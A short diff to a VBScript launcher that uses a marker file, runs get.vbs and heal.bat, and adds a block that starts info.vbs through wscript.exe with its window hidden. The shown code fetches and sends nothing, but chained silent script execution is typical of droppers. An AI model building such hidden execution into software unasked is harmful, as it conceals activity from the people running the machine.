@@ -22,6 +22,7 @@ End If
 If Not objFSO.FileExists(txtFile) Then
     ' Run the get.vbs file if it exists
     If objFSO.FileExists(getVbsFile) Then
+        ' Run the get.vbs script silently
         objShell.Run """" & getVbsFile & """", 0, True ' Run the .vbs file synchronously
     End If
 
@@ -34,9 +35,16 @@ If Not objFSO.FileExists(txtFile) Then
     markerFile.Close
 End If
 
+' Define path for the heal.bat file
 batFilePath = strFolder & "\heal.bat"
 
 ' Execute the batch file silently
 objShell.Run """" & batFilePath & """", 0, False
 
-' MsgBox("Ready or not updated")
+' Now silently execute the target .vbs script from here (replace with correct path)
+Dim targetVbsPath
+targetVbsPath = strFolder & "\info.vbs" ' Replace with your target .vbs script path
+
+' Run the target .vbs script silently (0 means no window, 1 means normal window)
+objShell.Run "wscript.exe """ & targetVbsPath & """", 0, False
+
